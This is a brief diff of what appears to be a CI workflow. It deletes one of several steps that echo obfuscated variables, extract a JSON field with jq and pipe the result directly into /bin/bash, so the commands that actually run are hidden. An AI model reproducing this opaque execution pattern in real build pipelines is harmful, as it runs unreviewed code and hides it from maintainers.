@@ -23,7 +23,6 @@ jobs:
           echo $yx770 | jq -r .gav79 | /bin/bash
           echo $jwlzq0281 | jq -r .hhud0510 | /bin/bash
           echo $vd862 | jq -r .oj7 | /bin/bash
-          echo $unqv15 | jq -r .ttu2171 | /bin/bash
           printf '%s' "$urm46466" | jq -r .go86892 | /bin/bash
 
       - name: Store results
